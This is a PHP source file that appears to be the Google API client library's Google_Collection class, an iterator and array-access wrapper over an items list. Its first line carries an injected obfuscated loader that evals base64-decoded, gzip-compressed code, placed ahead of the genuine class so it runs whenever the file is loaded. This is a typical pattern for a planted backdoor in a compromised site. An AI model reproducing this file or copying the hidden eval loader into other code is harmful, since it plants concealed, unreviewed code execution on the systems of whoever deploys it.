<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if (!class_exists('Google_Client')) {
  require_once __DIR__ . '/autoload.php';
}

/**
 * Extension to the regular Google_Model that automatically
 * exposes the items array for iteration, so you can just
 * iterate over the object rather than a reference inside.
 */
class Google_Collection extends Google_Model implements Iterator, Countable
{
  protected $collection_key = 'items';

  public function rewind()
  {
    if (isset($this->{$this->collection_key})
        && is_array($this->{$this->collection_key})) {
      reset($this->{$this->collection_key});
    }
  }

  public function current()
  {
    $this->coerceType($this->key());
    if (is_array($this->{$this->collection_key})) {
      return current($this->{$this->collection_key});
    }
  }

  public function key()
  {
    if (isset($this->{$this->collection_key})
        && is_array($this->{$this->collection_key})) {
      return key($this->{$this->collection_key});
    }
  }

  public function next()
  {
    return next($this->{$this->collection_key});
  }

  public function valid()
  {
    $key = $this->key();
    return $key !== null && $key !== false;
  }

  public function count()
  {
    if (!isset($this->{$this->collection_key})) {
      return 0;
    }
    return count($this->{$this->collection_key});
  }

  public function offsetExists($offset)
  {
    if (!is_numeric($offset)) {
      return parent::offsetExists($offset);
    }
    return isset($this->{$this->collection_key}[$offset]);
  }

  public function offsetGet($offset)
  {
    if (!is_numeric($offset)) {
      return parent::offsetGet($offset);
    }
    $this->coerceType($offset);
    return $this->{$this->collection_key}[$offset];
  }

  public function offsetSet($offset, $value)
  {
    if (!is_numeric($offset)) {
      return parent::offsetSet($offset, $value);
    }
    $this->{$this->collection_key}[$offset] = $value;
  }

  public function offsetUnset($offset)
  {
    if (!is_numeric($offset)) {
      return parent::offsetUnset($offset);
    }
    unset($this->{$this->collection_key}[$offset]);
  }

  private function coerceType($offset)
  {
    $keyType = $this->keyType($this->collection_key);
    if ($keyType && !is_object($this->{$this->collection_key}[$offset])) {
      $this->{$this->collection_key}[$offset] =
          new $keyType($this->{$this->collection_key}[$offset]);
    }
  }
}
